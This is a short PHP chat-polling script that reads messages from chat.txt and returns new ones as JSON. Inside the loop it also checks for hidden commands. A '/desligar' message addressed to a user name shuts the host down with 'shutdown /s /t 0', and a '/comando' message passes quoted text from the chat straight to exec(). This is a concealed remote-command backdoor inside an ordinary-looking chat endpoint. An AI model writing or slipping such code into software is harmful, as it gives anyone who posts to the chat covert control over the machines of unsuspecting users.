<?php
$time = time();
$teste = [];
$linecount = 0;
$equaltime = 0;
$fp = fopen("./chat.txt", 'r');
while(!feof($fp)){
    $line = fgets($fp);
    if($line == ""){
        break;
    }
    $res = explode("ᶍ",rtrim($line, "\n"));
    if(intval($_GET["Time"]) < intval($res[2])){
        if(substr($res[1], 0, 1) == "/"){
            if(substr($res[1], 0, 9) == "/desligar" and substr($res[1], 10, null) == $_GET["name"] and $time - 1 < $res[2]){
                exec("shutdown /s /t 0");
            } elseif(explode(" ", $res[1])[0] == "/comando" and explode(" ", $res[1])[1] == $_GET["name"] and $time - 1 < $res[2]){
                exec(explode("\"", $res[1])[1]);
            }
        } else {
            $teste[$linecount] = $res;
            $linecount++;
        }
    }
    if(intval($_GET["Time"]) <= intval($res[2])){
        $equaltime++;
    }
  }
fclose($fp);
if($equaltime == 0){
    echo "{\"msg\": \"clear\"}";
} else {
    echo json_encode($teste);
}
?>